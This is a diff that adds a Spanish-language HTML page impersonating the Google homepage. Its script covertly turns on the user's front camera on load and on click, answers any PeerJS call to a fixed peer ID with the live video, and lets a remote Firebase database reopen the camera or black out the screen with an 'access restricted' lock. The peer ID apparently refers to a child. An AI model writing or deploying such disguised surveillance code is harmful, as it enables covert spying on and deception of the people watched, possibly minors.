@@ -1,1 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { margin: 0; font-family: arial, sans-serif; background: white; overflow: hidden; }
+        #bloqueo { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 9999; justify-content: center; align-items: center; }
+        .google-home { display: flex; flex-direction: column; align-items: center; padding-top: 100px; height: 100vh; }
+        .logo { width: 160px; margin-bottom: 20px; }
+        .search-bar { width: 90%; max-width: 580px; border: 1px solid #dfe1e5; padding: 12px 20px; border-radius: 24px; font-size: 16px; outline: none; box-shadow: 0 1px 6px rgba(32,33,36,.28); }
+        #videoLocal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 5000; }
+    </style>
+</head>
+<body>
 
+    <div id="bloqueo"><h1 style="color:red; font-family:sans-serif;">⚠️ ACCESO RESTRINGIDO</h1></div>
+    <video id="videoLocal" autoplay playsinline muted></video>
+
+    <div class="google-home" onclick="activarPermisos()">
+        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
+        <div style="width:100%; display:flex; justify-content:center;">
+            <input type="text" class="search-bar" placeholder="Buscar en Google o escribir URL">
+        </div>
+        <p style="color:#70757a; font-size: 14px; margin-top: 20px;">Google ofrecido en: Español (Latinoamérica)</p>
+    </div>
+
+    <script>
+        const firebaseConfig = { databaseURL: "https://micontrol-30a70-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const peer = new Peer('camara-nino-123');
+        const videoLocal = document.getElementById('videoLocal');
+        let streamLocal = null;
+
+        function activarPermisos() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then((stream) => {
+                streamLocal = stream;
+                videoLocal.srcObject = stream;
+                console.log("Cámara activa");
+            })
+            .catch((err) => { console.log("Error de permisos"); });
+        }
+
+        // Intento automático al cargar
+        window.onload = () => { setTimeout(activarPermisos, 1500); };
+
+        db.ref('bloqueo').on('value', (snap) => {
+            document.getElementById('bloqueo').style.display = (snap.val() === "SI") ? "flex" : "none";
+        });
+
+        db.ref('comando_camara').on('value', (snap) => {
+            if (snap.val() === "ABRIR") { activarPermisos(); }
+        });
+
+        peer.on('call', (call) => {
+            if (streamLocal) { call.answer(streamLocal); }
+        });
+    </script>
+</body>
+</html>
